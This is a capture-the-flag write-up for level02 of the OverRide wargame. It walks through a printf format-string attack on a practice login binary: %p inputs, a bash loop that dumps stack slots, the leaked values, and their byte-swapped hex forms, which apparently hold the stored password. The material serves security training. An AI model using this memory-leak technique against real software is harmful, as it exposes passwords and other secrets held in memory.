# level02


In this exercice, we will exploit a vulnerability in a printf call, first, let's try to see if we can print some addresses:

```bash
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p %p %p %p
--[ Password: %p %p %p %p
*****************************************
0x7fffffffe500 (nil) 0x25 0x2a2a2a2a2a2a2a2a does not have access!
level02@OverRide:~$
```

We can see that a vulnerability, let's try to print the stack to see if we can find a pattern of addresses:

```bash
for ((i=0 ; i < 128; i++)); do echo "$i - %$i\$p" | ./level02; done | grep "does not have access"
```

We can see a pattern of addresses at the begining, after the initialisation:

```bash
10 - (nil) does not have access!
11 - (nil) does not have access!
12 - (nil) does not have access!
13 - (nil) does not have access!
14 - (nil) does not have access!
15 - (nil) does not have access!
16 - (nil) does not have access!
17 - (nil) does not have access!
18 - (nil) does not have access!
19 - (nil) does not have access!
20 - 0x100000000 does not have access!
21 - (nil) does not have access!
22 - 0x756e505234376848 does not have access!
23 - 0x45414a3561733951 does not have access!
24 - 0x377a7143574e6758 does not have access!
25 - 0x354a35686e475873 does not have access!
26 - 0x48336750664b394d does not have access!
```

We will convert the addresses to big endian, to do so, we will use [this tool](https://www.save-editor.com/tools/wse_hex.html):

4868373452506E75
51397361354A4145
58674E5743717A37
7358476E68354A35
4D394B6650673348